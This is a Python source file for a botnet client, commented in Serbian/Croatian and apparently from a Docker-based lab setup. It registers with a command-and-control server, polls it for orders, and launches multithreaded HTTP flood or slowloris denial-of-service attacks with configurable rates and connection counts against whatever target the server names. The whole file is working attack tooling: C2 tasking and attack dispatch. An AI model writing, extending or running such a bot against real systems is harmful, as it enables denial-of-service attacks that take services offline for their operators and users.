import time   
import uuid      
import threading  
import requests  

from attacks import run_http_flood, run_slowloris

C2_POLL_URL = "http://c2:5001/api/bot/poll" # c2 je ime compose servisa
 
POLL_INTERVAL = 2 


def poll_c2(bot_id, stats):

    try:
        response = requests.post( # kad odg stigne stavlja se u response
            C2_POLL_URL,
            json={
                "bot_id": bot_id,           
                "active_connections": stats["active_connections"],
                "requests_sent": stats["requests_sent"],
                "requests_failed": stats["requests_failed"]
            },
            timeout=5  
        )

        return response.json()
    
    except requests.exceptions.RequestException:
        return {"attack_type": None, "target_host": None, "params": None}


def stop_current_attack(stop_event, attack_threads): 

    stop_event.set() # sve trenutno akt niti dele isti stop_event   

    for t in attack_threads: 
        t.join() # blokirajuce, ceka dok se sve ne zavrse


def start_attack(attack, stop_event, stats):

    threads = []
    target_host = attack["target_host"]
    params = attack["params"]

    if attack["attack_type"] == "http_flood":

        rps = params["rps_per_bot"]
        concurrency = params["concurrent_connections_per_bot"]
        rate_per_thread = rps / concurrency

        for _ in range(concurrency):

            t = threading.Thread( # pravi obj koji je buduca nit
                target=run_http_flood,
                args=(target_host, rate_per_thread, stop_event, stats)
            )

            t.start()
            threads.append(t)

    elif attack["attack_type"] == "slowloris":

        connections = params["connections_per_bot"]
        interval = params["keepalive_interval_seconds"]

        for _ in range(connections):

            t = threading.Thread(
                target=run_slowloris,
                args=(target_host, interval, stop_event, stats)
            )

            t.start()
            threads.append(t)

    return threads # vraca listu svih upravo pokrenutih niti


def main():
    
    bot_id = str(uuid.uuid4())

    stop_event = threading.Event()

    attack_threads = []

    stats = {"active_connections": 0, "requests_sent": 0, "requests_failed": 0}

    current_attack = {"attack_type": None, "target_host": None, "params": None}

    while True:

        new_attack = poll_c2(bot_id, stats)

        if new_attack != current_attack:

            stop_current_attack(stop_event, attack_threads)

            stop_event = threading.Event()

            stats["active_connections"] = 0
            stats["requests_sent"] = 0
            stats["requests_failed"] = 0

            current_attack = new_attack

            if current_attack["attack_type"] is not None:
                attack_threads = start_attack(current_attack, stop_event, stats)
            else:
                attack_threads = []

        time.sleep(POLL_INTERVAL)


if __name__ == "__main__":
    main()